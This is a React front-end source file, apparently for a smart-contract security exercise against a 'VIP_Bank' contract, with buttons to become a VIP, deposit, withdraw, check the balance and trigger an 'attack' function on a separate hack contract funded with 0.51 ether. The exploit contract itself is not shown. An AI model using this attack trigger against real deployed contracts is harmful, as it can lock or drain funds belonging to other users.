import { ethers } from "ethers";
import React from "react";

const BANK_CONTRACT_ADDRESS = "0xDbdFDa1Bb3023a9E64a7B587FF6e29De27E373ed";
const HACK_CONTRACT_ADDRESS = "0x9b8f2c0508f912323f4f3D8a98dcE57B2D1DfF3e";
const BANK_ABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "VIP",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "addr",
        "type": "address"
      }
    ],
    "name": "addVIP",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "balances",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "contractBalance",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "deposit",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "manager",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "maxETH",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "_amount",
        "type": "uint256"
      }
    ],
    "name": "withdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];
const HACK_ABI = [
  {
    "inputs": [
      {
        "internalType": "contract VIP_Bank",
        "name": "_vip",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "attack",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  }
];


const App = () => {

  const MakingVIP = async () => {

    try {
      console.log("Begin");
      const { ethereum } = window;
  
      if (ethereum) {
  
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const bankconnectedContract = new ethers.Contract(BANK_CONTRACT_ADDRESS, BANK_ABI, signer);
        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  
        console.log("Connected", accounts[0]);
  
        console.log("Going to pop wallet now to pay gas...")
        let addVIP = await bankconnectedContract.addVIP("0x698ee928558640e35f2a33cC1e535Cf2F9a139c8");
        console.log("Making you a VIP process started");
        await addVIP.wait();
        console.log("Making you a VIP process finished");
         
      } 
      else {
        console.log("Ethereum object doesn't exist!");
      }
    } catch (error) {
      console.log(error)
    }
  }

  const DepositInContract = async () => {

    try {
      console.log("Begin");
      const { ethereum } = window;
  
      if (ethereum) {
  
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const bankconnectedContract = new ethers.Contract(BANK_CONTRACT_ADDRESS, BANK_ABI, signer);
        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  
        console.log("Connected", accounts[0]);

         
        let deposit = await bankconnectedContract.functions.deposit({ 
          value: ethers.utils.parseEther("0.001"),
          gasLimit: 50000,
          gasPrice: ethers.utils.parseUnits("10", "gwei")
        });
        
        console.log("Depositing 0.001 ether: Process started");
        await deposit.wait();
        console.log("Depositing 0.001 ether: Process finished");

      } 
      else {
        console.log("Ethereum object doesn't exist!");
      }
    } catch (error) {
      console.log(error)
    }
  }


  const WithdrawFromContract = async () => {

    try {
      console.log("Begin");
      const { ethereum } = window;
  
      if (ethereum) {
  
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const bankconnectedContract = new ethers.Contract(BANK_CONTRACT_ADDRESS, BANK_ABI, signer);
        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  
        console.log("Connected", accounts[0]);

        let withdraw = await bankconnectedContract.withdraw(1000000000000000);
        console.log("Withdrawing 0.001 ether process started");
        await withdraw.wait();
        console.log("Withdrawing 0.001 ether process finished");

      } 
      else {
        console.log("Ethereum object doesn't exist!");
      }
    } catch (error) {
      console.log(error)
    }
  }

  const HackTheContract = async () => {

    try {
      console.log("Begin");
      const { ethereum } = window;
  
      if (ethereum) {
  
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const hackconnectedContract = new ethers.Contract(HACK_CONTRACT_ADDRESS, HACK_ABI, signer);
        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  
        console.log("Connected", accounts[0]); 
        let withdraw = await hackconnectedContract.attack({ 
          value: ethers.utils.parseEther("0.51"),
          gasLimit: 50000,
          gasPrice: ethers.utils.parseUnits("10", "gwei")
        });
        console.log("Hacking the smart contract: Process started");
        await withdraw.wait();
        console.log("Hacking the smart contract: Process fininshed");

      } 
      else {
        console.log("Ethereum object doesn't exist!");
      }
    } catch (error) {
      console.log(error)
    }
  }


  const checkBalance = async () => {

    try {
      console.log("Begin");
      const { ethereum } = window;
  
      if (ethereum) {
  
        const provider = new ethers.providers.Web3Provider(ethereum);
        const bankconnectedContract = new ethers.Contract(BANK_CONTRACT_ADDRESS, BANK_ABI, provider);
        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  
        console.log("Connected", accounts[0]);

        let checkBalance = await bankconnectedContract.contractBalance();
        console.log("Balance is :",ethers.utils.formatUnits(checkBalance), "ether");

      } 
      else {
        console.log("Ethereum object doesn't exist!");
      }
    } catch (error) {
      console.log(error)
    }
  }
  
  return (
    <div>
      <button onClick={() => MakingVIP().then(/* handle promise here */)}>Become a VIP</button>
      <button onClick={() => checkBalance().then(/* handle promise here */)}>Check Contract Balance</button>
      <button onClick={() => DepositInContract().then(/* handle promise here */)}>Deposit 0.001 Ether</button>
      <button onClick={() => WithdrawFromContract().then(/* handle promise here */)}>Withdraw 0.001 Ether</button>
      <button onClick={() => HackTheContract().then(/* handle promise here */)}>Hack the Contract(Already called)</button>
    </div>
  );
};

export default App;
